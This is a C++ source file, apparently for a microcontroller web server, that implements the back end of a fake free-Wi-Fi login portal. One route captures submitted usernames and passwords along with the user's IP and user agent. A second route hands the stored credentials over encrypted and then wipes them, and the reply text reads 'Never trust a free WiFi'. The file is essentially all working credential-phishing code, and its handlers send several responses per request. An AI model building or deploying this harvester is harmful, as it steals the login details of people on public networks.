#include "access_controller.h"

#include <HardwareSerial.h>

#include "../../access/repository/access_repository.h"
#include "../../cryptography/service/crypto_cipher.h"

namespace access_controller
{
void register_routes(AsyncWebServer& server)
{
    server.on("/api/add-access", HTTP_POST,
              [](AsyncWebServerRequest* request)
              {
                  access_repository::init();
                  Serial.print("Init done");
                  if (request->hasParam("username", true) && request->hasParam("password", true))
                  {
                      String username = request->getParam("username", true)->value();
                      String password = request->getParam("password", true)->value();
                      String ip = request->client()->remoteIP().toString();
                      String user_agent = request->header("User-Agent");
                      String content_type = request->contentType();

                      int outcome = access_repository::add_access(
                          username.c_str(), password.c_str(), ip.c_str(), content_type.c_str(),
                          user_agent.c_str());
                      if (outcome != 0) request->send(500, "text/plain", "Error during the access");

                      request->send(200, "text/plain", "Never trust a free WiFi");
                  }
                  request->send(400, "text/plain", "Missing paramters");
              });
    server.on("/api/access", HTTP_GET,
              [](AsyncWebServerRequest* request)
              {
                  String response;
                  access_repository::retrieve_access(response);
                  uint8_t output[2048];
                  size_t o_len = 0;
                  if (crypto_cipher::encrypt_data((unsigned char*)response.c_str(),
                                                  strlen(response.c_str()), output, 2048,
                                                  &o_len) == false)
                      return request->send(500, "text/plain", "Error during the cypher");

                  AsyncResponseStream* res =
                      request->beginResponseStream("application/octet-stream");
                  res->write(output, o_len);
                  res->setCode(200);
                  request->send(res);
                  access_repository::clean();
              });
}
}  // namespace access_controller